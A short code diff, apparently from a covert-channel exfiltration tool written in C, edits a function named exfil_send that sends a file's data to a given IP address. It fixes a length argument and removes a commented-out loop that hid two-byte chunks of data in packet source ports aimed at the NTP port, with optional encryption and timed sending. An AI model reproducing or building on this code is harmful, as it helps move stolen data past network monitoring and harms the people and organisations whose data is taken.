@@ -217,7 +217,7 @@ void exfil_send(uint32 ipaddr, char *path)
 
 		tot_len = buflen + 1;
 
-		trans = buildTransmission(buffer, &buflen, XFL_TYP);
+		trans = buildTransmission(buffer, &tot_len, XFL_TYP);
 
 		printf("Data: %s\n", buffer);
 
@@ -248,29 +248,9 @@ void exfil_send(uint32 ipaddr, char *path)
 				usleep(SLEEP_TIME);
 				_send(ipaddr, src_port, dst_port, channel);
 			}
+
 //			free(enc);
 		}
-
-//		for (int i = 0; i < buflen;)
-//		{
-//			char *enc;
-//			ushort src_port = 0;
-//			ushort dst_port = 0;
-//
-//			//enc = encrypt(SEKRET, pbuf, 2);
-//
-//			enc = buildTransmission(enc, &buflen, XFL_TYP);
-//
-//			src_port = (enc[0] << 8) + enc[1];
-//			dst_port = PORT_NTP;
-//			free(enc);
-//
-//			_send(ipaddr, src_port, dst_port, TRUE);
-//
-//			i += 2;
-//			pbuf += 2;
-//			usleep(SLEEP_TIME);
-//		}
 	}
 }
 
